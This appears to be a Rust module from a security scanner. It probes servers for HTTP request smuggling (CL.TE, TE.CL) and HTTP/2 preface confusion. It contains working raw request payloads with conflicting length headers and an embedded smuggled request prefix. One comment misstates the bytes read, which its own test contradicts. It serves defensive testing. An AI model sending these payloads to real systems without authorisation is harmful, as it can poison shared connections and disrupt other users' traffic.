/// HTTP request smuggling probe (CL.TE / TE.CL).
///
/// Detects discrepancies between front-end proxies and back-end servers
/// in parsing Content-Length vs Transfer-Encoding headers.
///
/// # Detection Method
/// - **CL.TE**: Front-end reads `Content-Length`, back-end reads `Transfer-Encoding: chunked`.
///   The back-end processes the chunked terminator (`0\r\n\r\n`) and then waits for more data,
///   causing a time delay.
/// - **TE.CL**: Front-end reads `Transfer-Encoding: chunked`, back-end reads `Content-Length`.
///   The back-end reads a fixed number of bytes, leaving a smuggled request in the pipeline.
///
/// # References
/// - PortSwigger Research: <https://portswigger.net/web-security/request-smuggling>
/// - RFC 7230 §3.3.3: Message Body Length
use anyhow::Result;
use std::time::Duration;
use tokio::io::AsyncReadExt;

/// Which smuggling variant was tested.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SmuggleVariant {
    /// Front-end uses Content-Length, back-end uses Transfer-Encoding.
    ClTe,
    /// Front-end uses Transfer-Encoding, back-end uses Content-Length.
    TeCl,
    /// Server mishandles HTTP/2 preface followed by HTTP/1.1.
    H2Preface,
}

/// Confidence level of the detection result.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Confidence {
    /// Definite time-delay anomaly observed.
    Definite,
    /// Likely vulnerable based on heuristic match.
    Likely,
    /// Detection relied on timeout (server hung).
    Timeout,
    /// Result is ambiguous — inconclusive.
    Ambiguous,
}

/// Result of a smuggling probe.
#[derive(Debug, Clone)]
pub struct SmuggleResult {
    /// Whether the target appears vulnerable.
    pub vulnerable: bool,
    /// Which variant was tested.
    pub variant: SmuggleVariant,
    /// Confidence of the result.
    pub confidence: Confidence,
    /// Response time in milliseconds (relevant for time-delay detection).
    pub response_time_ms: f64,
}

/// HTTP request smuggling probe.
pub struct SmuggleProbe;

impl SmuggleProbe {
    /// Probe for CL.TE smuggling via time-delay detection.
    ///
    /// Sends a request with both `Content-Length: 6` and
    /// `Transfer-Encoding: chunked`. The body contains `0\r\n\r\nX`.
    /// If the front-end uses CL (reads 6 bytes = full request) but the
    /// back-end uses TE (reads chunked terminator then waits), a time
    /// delay indicates vulnerability.
    pub async fn probe_cl_te(target: &str, port: u16) -> Result<SmuggleResult> {
        let payload = format!(
            "POST / HTTP/1.1\r\n\
             Host: {target}\r\n\
             Content-Length: 6\r\n\
             Transfer-Encoding: chunked\r\n\
             \r\n\
             0\r\n\
             \r\n\
             X"
        );

        Self::send_probe(target, port, &payload, SmuggleVariant::ClTe).await
    }

    /// Probe for TE.CL smuggling via differential response.
    ///
    /// Sends a request with both `Transfer-Encoding: chunked` and
    /// `Content-Length: 4`. The chunked body contains a second request
    /// embedded in the chunk data. If the front-end uses TE but the
    /// back-end uses CL, the back-end reads only 4 bytes, leaving the
    /// embedded request in the pipeline.
    pub async fn probe_te_cl(target: &str, port: u16) -> Result<SmuggleResult> {
        // Chunked body: "5\r\nGPOST\r\n0\r\n\r\n"
        // If front-end reads TE → sees full chunked body.
        // If back-end reads CL=4 → reads "5\r\nGP" only, leaving "OST\r\n..." for next request.
        let payload = format!(
            "POST / HTTP/1.1\r\n\
             Host: {target}\r\n\
             Content-Length: 4\r\n\
             Transfer-Encoding: chunked\r\n\
             \r\n\
             5\r\n\
             GPOST\r\n\
             0\r\n\
             \r\n"
        );

        Self::send_probe(target, port, &payload, SmuggleVariant::TeCl).await
    }

    /// Probe for HTTP/2 preface poisoning.
    ///
    /// Sends the HTTP/2 connection preface (24 bytes) followed immediately
    /// by an HTTP/1.1 GET request. If the server ignores the preface and
    /// processes the HTTP/1.1 request (returning 200 OK), it indicates
    /// protocol boundary confusion.
    pub async fn probe_h2_preface(target: &str, port: u16) -> Result<SmuggleResult> {
        let stream = tokio::net::TcpStream::connect((target, port)).await?;
        let (mut rx, mut tx) = stream.into_split();

        let preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
        let http1 = format!("GET / HTTP/1.1\r\nHost: {target}\r\n\r\n");

        tokio::io::AsyncWriteExt::write_all(&mut tx, preface).await?;
        tokio::io::AsyncWriteExt::write_all(&mut tx, http1.as_bytes()).await?;
        tokio::io::AsyncWriteExt::flush(&mut tx).await?;

        let mut buf = vec![0u8; 4096];
        let read_result = tokio::time::timeout(Duration::from_secs(10), rx.read(&mut buf)).await;
        drop(tx);

        match read_result {
            Ok(Ok(n)) => {
                let response = String::from_utf8_lossy(&buf[..n]);
                let is_http1_ok = response.starts_with("HTTP/1.1 2");
                let is_http1_reject = response.starts_with("HTTP/1.1 4");

                let (vulnerable, confidence) = if is_http1_ok {
                    (true, Confidence::Definite)
                } else if is_http1_reject {
                    (false, Confidence::Definite)
                } else {
                    (false, Confidence::Ambiguous)
                };

                Ok(SmuggleResult {
                    vulnerable,
                    variant: SmuggleVariant::H2Preface,
                    confidence,
                    response_time_ms: 0.0,
                })
            }
            Ok(Err(e)) => Err(anyhow::anyhow!("h2 preface probe read error: {e:?}")),
            Err(_) => Ok(SmuggleResult {
                vulnerable: false,
                variant: SmuggleVariant::H2Preface,
                confidence: Confidence::Timeout,
                response_time_ms: 0.0,
            }),
        }
    }

    async fn send_probe(
        target: &str,
        port: u16,
        payload: &str,
        variant: SmuggleVariant,
    ) -> Result<SmuggleResult> {
        let stream = tokio::net::TcpStream::connect((target, port)).await?;

        let (mut rx, mut tx) = stream.into_split();
        tokio::io::AsyncWriteExt::write_all(&mut tx, payload.as_bytes()).await?;
        tokio::io::AsyncWriteExt::flush(&mut tx).await?;

        let start = std::time::Instant::now();
        let mut buf = vec![0u8; 4096];

        // For CL.TE, we expect a timeout if vulnerable (back-end waits).
        let read_result = tokio::time::timeout(Duration::from_secs(10), rx.read(&mut buf)).await;
        drop(tx);
        let elapsed_ms = start.elapsed().as_secs_f64() * 1000.0;

        match read_result {
            Ok(Ok(n)) => {
                let response = String::from_utf8_lossy(&buf[..n]);
                // Heuristic: if we got a partial or unusual response, flag as likely.
                let likely = response.contains("HTTP/1.1") && !response.contains("400");
                Ok(SmuggleResult {
                    vulnerable: likely && variant == SmuggleVariant::TeCl,
                    variant,
                    confidence: if likely {
                        Confidence::Likely
                    } else {
                        Confidence::Ambiguous
                    },
                    response_time_ms: elapsed_ms,
                })
            }
            Ok(Err(e)) => Err(anyhow::anyhow!("smuggle probe read error: {e:?}")),
            Err(_) => {
                // Timeout on CL.TE strongly suggests the back-end is waiting
                // for more chunked data → CL.TE vulnerability.
                Ok(SmuggleResult {
                    vulnerable: variant == SmuggleVariant::ClTe,
                    variant,
                    confidence: Confidence::Timeout,
                    response_time_ms: elapsed_ms,
                })
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_smuggle_probe_no_server() {
        let result = SmuggleProbe::probe_cl_te("127.0.0.1", 59999).await;
        assert!(
            result.is_err(),
            "smuggle probe to nothing should fail: {:?}",
            result.ok()
        );
    }

    #[test]
    fn test_smuggle_result_types() {
        fn assert_send_sync<T: Send + Sync>() {}
        assert_send_sync::<SmuggleResult>();
    }

    #[test]
    fn test_cl_te_payload_length() {
        // The CL.TE payload has Content-Length: 6.
        // Body: "0\r\n\r\nX" = 6 bytes.
        let payload = "0\r\n\r\nX";
        assert_eq!(payload.len(), 6);
    }

    #[test]
    fn test_te_cl_payload_length() {
        // The TE.CL payload has Content-Length: 4.
        // First 4 bytes of body: "5\r\nGP".
        let body = "5\r\nGPOST\r\n0\r\n\r\n";
        assert_eq!(&body[..4], "5\r\nG");
        assert_eq!(body[..4].len(), 4);
    }
}
